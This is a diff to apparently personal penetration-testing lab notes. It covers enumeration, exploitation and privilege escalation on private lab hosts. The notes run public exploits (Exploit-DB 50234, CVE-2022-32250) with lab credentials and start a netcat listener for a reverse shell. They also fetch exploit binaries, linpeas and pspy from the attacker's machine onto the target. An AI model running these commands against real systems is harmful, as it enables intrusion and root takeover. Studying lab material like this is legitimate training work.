@@ -227,7 +227,7 @@ python3 vestaROOT.py https://192.168.230.156:8083 Jack 3PUKsX98BMupBiCf
 
 .157
 ```
-nmap 192.168.230.157
+nmap 192.168.240.157
 nmap -sT -A -p 21,22,80,20000 -Pn 192.168.230.157
 
 # enumerate webserver
@@ -248,7 +248,7 @@ ftp cassie@192.168.230.157 # works with password cassie
 https://www.exploit-db.com/exploits/50234
 searchsploit -m 50234
 # modify file to set our kali IP and port
-python3 50234.py --host 192.168.230.157 --login cassie --password cassie
+python3 50234.py --host 192.168.240.157 --login cassie --password cassie
 nc -nvlp 1234
 ```
 
@@ -256,19 +256,34 @@ nc -nvlp 1234
 ```
 # looks like it's vulnerable to dirty pipe based on kernel version - this is not working though
 # create exploit files and copy to container root 
+wget https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
 sudo su -
 cd /home/kali/lab3
-cp exploit-1.c /var/lib/machines/xen-test/root/
+cp exp.c /var/lib/machines/xen-test/root/
 
 cd /var/lib/machines/xen-test/root
 sudo systemd-nspawn -M xen-test
 
 # compile exploit in container
-gcc -o exploit-1 exploit-1.c
+gcc exp.c -o exp -l mnl -l nftnl -w
 
 # copy back to lab folder
-cp exploit-1 /home/kali/lab3/
+cp exp /home/kali/lab3/
 
 # from target
-wget http://192.168.45.234/exploit-1
+wget http://192.168.45.234/exp
+
+# try linpeas
+wget http://192.168.45.234/linpeas.sh -O linpeas.sh
+
+# findings
+.sudo_as_admin_successful in /home/cassie
+look in /opt (/opt/admin is writable)
+/var/log/vsftpd.log 
+/usr/bin/write.ul (Unknown SGID binary)
+ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304) 
+/var/log/apache2/access.log 
+
+wget http://192.168.45.234/sudo.sh -O sudo.sh
+wget http://192.168.45.234/pspy64 -O pspy
 ```
